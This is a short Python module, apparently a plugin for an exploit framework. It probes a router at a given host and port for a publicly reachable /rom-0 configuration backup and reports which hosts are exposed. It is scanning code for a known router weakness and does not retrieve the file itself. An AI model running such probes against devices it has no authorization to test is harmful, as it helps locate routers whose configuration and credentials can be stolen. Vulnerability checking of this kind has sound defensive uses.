#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import requests

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {

    }
    prompt = 'rom-0'

    def check(self, host, port, timeout):
        s = requests.Session()
        content_type = 'application/octet-stream'
        try:
            resp = s.get('http://{}:{}/rom-0'.format(host, port), timeout=10, stream=True)
        except requests.RequestException as err:
            utils.print_warning('{}:{} request error, msg: {}'.format(host, port, type(err).__name__))
            return False
        else:
            if resp.status_code == requests.codes.ok and resp.headers.get('Content-Type') == content_type:
                utils.print_success('{} rom-0 is accessible'.format(host))
                return True
            else:
                utils.print_info('{} is not affected by rom-0'.format(host))
                return False
        finally:
            s.close()
